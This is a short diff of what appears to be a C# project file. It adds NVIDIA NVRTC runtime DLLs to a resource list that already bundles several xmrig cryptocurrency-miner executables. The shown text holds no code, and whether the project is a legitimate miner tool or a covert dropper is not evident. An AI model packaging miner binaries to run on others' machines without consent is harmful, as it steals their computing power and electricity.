@@ -140,6 +140,8 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="Icon.ico" />
+    <None Include="Resources\nvrtc-builtins64_90.dll" />
+    <None Include="Resources\nvrtc64_90.dll" />
     <None Include="Resources\xmrig-nvidia9.exe" />
     <None Include="Resources\xmrig.exe" />
     <None Include="Resources\xmrig-nvidia.exe" />
